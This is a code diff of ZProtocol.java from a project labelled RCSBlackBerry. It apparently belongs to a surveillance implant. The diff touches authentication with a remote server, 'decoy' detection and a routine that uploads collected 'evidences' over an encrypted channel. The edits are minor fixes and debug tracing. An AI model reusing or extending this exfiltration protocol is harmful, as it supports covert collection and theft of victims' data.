@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action.sync.protocol;
 
 import java.io.EOFException;
@@ -69,6 +69,9 @@ public class ZProtocol extends Protocol {
         //#endif
 
         try {
+            
+            transport.start();
+            
             //#ifdef DEBUG
             debug.info("***** Authentication *****");
             //#endif          
@@ -174,7 +177,12 @@ public class ZProtocol extends Protocol {
             debug.error(e);
             //#endif
             return false;
-        } finally {
+        } catch (Exception e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            //#endif
+            return false;
+        }finally {
             transport.close();
         }
     }
@@ -236,11 +244,13 @@ public class ZProtocol extends Protocol {
 
     protected void parseAuthentication(byte[] authResult)
             throws ProtocolException {
-        //#ifdef DBC
-        Check.ensures(authResult.length == 64, "authResult.length="
-                + authResult.length);
-        //#endif
-
+        if(authResult.length != 64){
+            //#ifdef DEBUG
+            debug.trace("parseAuthentication: wrong size. Probably a decoy.");
+            //#endif
+            throw new ProtocolException(14);
+        }
+               
         //#ifdef DEBUG
         debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
         //#endif
@@ -692,6 +702,8 @@ public class ZProtocol extends Protocol {
                 Utils.copy(plainOut, 4, content, 0, content.length);
 
                 byte[] response = command(Proto.LOG, plainOut);
+                plainOut=null;
+                
                 boolean ret = parseLog(response);
 
                 if (ret) {
@@ -708,7 +720,15 @@ public class ZProtocol extends Protocol {
                 debug.warn("Not empty directory");
                 //#endif
             }
+            
+            //#ifdef DEBUG
+            debug.trace("    dir finished: " + dir);
+            //#endif
         }
+        
+        //#ifdef DEBUG
+        debug.trace("sendEvidences finished");
+        //#endif
     }
 
     protected boolean parseLog(byte[] result) throws ProtocolException {
@@ -745,11 +765,9 @@ public class ZProtocol extends Protocol {
 
         try {
             byte[] plainIn;
-            //#ifdef ZNOSHA
-            plainIn = cypheredWriteRead(plainOut);
-            //#else
+
             plainIn = cypheredWriteReadSha(plainOut);
-            //#endif
+
             return plainIn;
         } catch (CryptoException e) {
             //#ifdef DEBUG
@@ -759,19 +777,6 @@ public class ZProtocol extends Protocol {
         }
     }
 
-    //#ifdef ZNOSHA
-    private byte[] cypheredWriteRead(byte[] plainOut)
-            throws TransportException, CryptoException {
-
-        debug.trace("cypheredWriteRead");
-
-        byte[] cypherOut = cryptoK.encryptData(plainOut);
-        byte[] cypherIn = transport.command(cypherOut);
-        byte[] plainIn = cryptoK.decryptData(cypherIn);
-        return plainIn;
-    }
-
-    //#endif
 
     private byte[] cypheredWriteReadSha(byte[] plainOut)
             throws TransportException, CryptoException {
@@ -784,7 +789,7 @@ public class ZProtocol extends Protocol {
         //#ifdef DEBUG        
         debug.trace("cypherOut: " + cypherOut.length);
         //#endif
-
+        
         byte[] cypherIn = transport.command(cypherOut);
 
         if (cypherIn.length < SHA1LEN) {
